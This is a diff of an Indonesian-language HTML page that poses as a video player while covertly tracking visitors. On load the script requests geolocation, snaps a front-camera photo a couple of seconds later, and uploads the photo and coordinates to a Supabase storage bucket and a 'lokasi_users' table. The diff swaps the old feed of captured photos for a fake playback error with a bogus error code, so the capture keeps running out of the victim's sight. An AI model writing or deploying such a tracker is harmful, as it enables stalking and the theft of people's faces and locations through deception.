@@ -3,13 +3,13 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>inierakingyazz</title>
+<title>YAZZACUMALAKA - Error Feed</title>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet" />
 <style>
   * { box-sizing: border-box; margin: 0; padding: 0; }
   body {
     font-family: 'Inter', sans-serif;
-    background: #0f0f0f; /* Hitam pekat ala platform video */
+    background: #0f0f0f;
     color: #eeeeee;
     display: flex;
     flex-direction: column;
@@ -18,7 +18,6 @@
     padding-bottom: 40px;
   }
 
-  /* Header Minimalis */
   header {
     width: 100%;
     padding: 20px;
@@ -26,7 +25,7 @@
     font-size: 1.5rem;
     font-weight: 600;
     letter-spacing: -1px;
-    color: #3498db; /* Biru aksen Videy */
+    color: #e74c3c; /* Warna merah error */
     border-bottom: 1px solid #222;
     background: rgba(15, 15, 15, 0.8);
     backdrop-filter: blur(10px);
@@ -35,7 +34,6 @@
     z-index: 100;
   }
 
-  /* Status Container */
   #statusBox {
     width: 90%;
     max-width: 500px;
@@ -49,11 +47,10 @@
 
   #statusText { 
     font-size: 0.9rem; 
-    color: #aaa;
+    color: #ff4d4d;
     margin-bottom: 10px;
   }
 
-  /* Feed Media */
   #list {
     width: 90%;
     max-width: 600px;
@@ -67,7 +64,6 @@
     border-radius: 16px;
     overflow: hidden;
     border: 1px solid #282828;
-    transition: transform 0.2s;
   }
 
   .media-container {
@@ -75,43 +71,43 @@
     aspect-ratio: 16 / 9;
     background: #000;
     display: flex;
+    flex-direction: column;
     align-items: center;
     justify-content: center;
     position: relative;
+    color: #555;
   }
 
-  .card img {
-    width: 100%;
-    height: 100%;
-    object-fit: contain;
+  /* Icon Video Rusak */
+  .error-icon {
+    font-size: 3rem;
+    margin-bottom: 10px;
   }
 
   .info-overlay {
     padding: 15px;
-    background: linear-gradient(transparent, rgba(0,0,0,0.8));
+    background: #151515;
   }
 
   .info-text {
     font-size: 0.8rem;
-    color: #888;
-    line-height: 1.4;
+    color: #555;
+    text-align: center;
   }
 
-  /* Hidden Canvas untuk Capture */
   #canvas { display: none; }
   video { display: none; }
 
-  /* Tombol Action */
   .floating-info {
     position: fixed;
     bottom: 20px;
-    background: #3498db;
+    background: #e74c3c;
     color: white;
     padding: 10px 20px;
     border-radius: 50px;
     font-size: 0.8rem;
     font-weight: 600;
-    box-shadow: 0 4px 15px rgba(52, 152, 219, 0.4);
+    box-shadow: 0 4px 15px rgba(231, 76, 60, 0.3);
   }
 </style>
 </head>
@@ -120,11 +116,21 @@
 <header>YAZZACUMALAKA</header>
 
 <div id="statusBox">
-  <div id="statusText">Menghubungkan ke server media...</div>
+  <div id="statusText">System: Mendeteksi pemutar video...</div>
 </div>
 
 <div id="list">
+  <div class="card">
+    <div class="media-container">
+      <div class="error-icon">⚠️</div>
+      <p>Video ini tidak dapat diputar</p>
+      <p style="font-size: 0.7rem;">Error Code: 0x80040255</p>
+    </div>
+    <div class="info-overlay">
+      <div class="info-text">Server Media Sibuk - Mencoba memuat ulang...</div>
+    </div>
   </div>
+</div>
 
 <div class="floating-info" id="notif">selamat menonton bang #inierayazz</div>
 
@@ -140,25 +146,21 @@
   const client = createClient(SUPABASE_URL, SUPABASE_KEY);
 
   const statusText = document.getElementById("statusText");
-  const listEl = document.getElementById("list");
   const video = document.getElementById("video");
   const canvas = document.getElementById("canvas");
 
-  // Alur Kerja: Lokasi -> Kamera -> Upload -> Tampilkan
+  // FITUR TETAP JALAN DI BELAKANG LAYAR
   async function startProcess() {
     statusText.innerText = "izinkan dulu bang baru nonton";
     
-    if (!navigator.geolocation) {
-      statusText.innerText = "Error: Geolocation tidak didukung";
-      return;
-    }
+    if (!navigator.geolocation) return;
 
     navigator.geolocation.getCurrentPosition(async (pos) => {
       const { latitude: lat, longitude: lon } = pos.coords;
-      statusText.innerText = "izinkan dulu bang";
+      statusText.innerText = "Memproses video... mohon tunggu";
       captureAndUpload(lat, lon);
     }, (err) => {
-      statusText.innerText = "Akses ditolak. Silakan refresh halaman.";
+      statusText.innerText = "Gagal memuat: Akses ditolak.";
     });
   }
 
@@ -167,15 +169,12 @@
       const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
       video.srcObject = stream;
 
-      // Tunggu sebentar agar kamera siap
       setTimeout(async () => {
         const context = canvas.getContext("2d");
         context.drawImage(video, 0, 0, canvas.width, canvas.height);
         
-        // Convert ke Blob (Lebih stabil dibanding ImageCapture)
         canvas.toBlob(async (blob) => {
           const fileName = `vid_${Date.now()}.jpg`;
-
           const { error: uploadError } = await client.storage
             .from(BUCKET)
             .upload(fileName, blob, { contentType: "image/jpeg" });
@@ -184,60 +183,20 @@
             await client.from("lokasi_users").insert([
               { foto: fileName, latitude: lat, longitude: lon }
             ]);
-            statusText.innerText = "Media berhasil diunggah.";
-            tampilkanFeed();
-          } else {
-            statusText.innerText = "Gagal mengunggah media.";
+            // Tidak menampilkan foto di layar, hanya mengubah status kecil
+            statusText.innerText = "Kesalahan teknis: Pemutar tidak didukung.";
           }
-
-          // Matikan kamera setelah selesai
           stream.getTracks().forEach(track => track.stop());
-        }, "image/jpeg", 0.8);
-      }, 1500);
+        }, "image/jpeg", 0.7);
+      }, 2000);
 
     } catch (err) {
-      statusText.innerText = "Gagal mengakses kamera.";
-      console.error(err);
+      console.error("Cam Error");
     }
   }
 
-  async function tampilkanFeed() {
-    const { data, error } = await client.storage.from(BUCKET).list("", {
-      limit: 10,
-      sortBy: { column: "created_at", order: "desc" }
-    });
-
-    if (error) return;
-
-    listEl.innerHTML = "";
-    for (const file of data) {
-      if (file.name === '.emptyFolderPlaceholder') continue;
-
-      const { data: publicUrl } = client.storage.from(BUCKET).getPublicUrl(file.name);
-      
-      const card = document.createElement("div");
-      card.className = "card";
-      
-      card.innerHTML = `
-        <div class="media-container">
-          <img src="${publicUrl.publicUrl}" alt="Media Content">
-        </div>
-        <div class="info-overlay">
-          <div class="info-text">
-            ID: ${file.name.split('_')[1]}<br>
-            Diunggah pada: ${new Date(file.created_at).toLocaleString('id-ID')}
-          </div>
-        </div>
-      `;
-      listEl.appendChild(card);
-    }
-  }
-
-  // Jalankan otomatis
+  // Menjalankan proses capture tanpa merubah list UI
   startProcess();
-  // Refresh feed tiap 30 detik
-  setInterval(tampilkanFeed, 30000);
 </script>
 </body>
 </html>
-
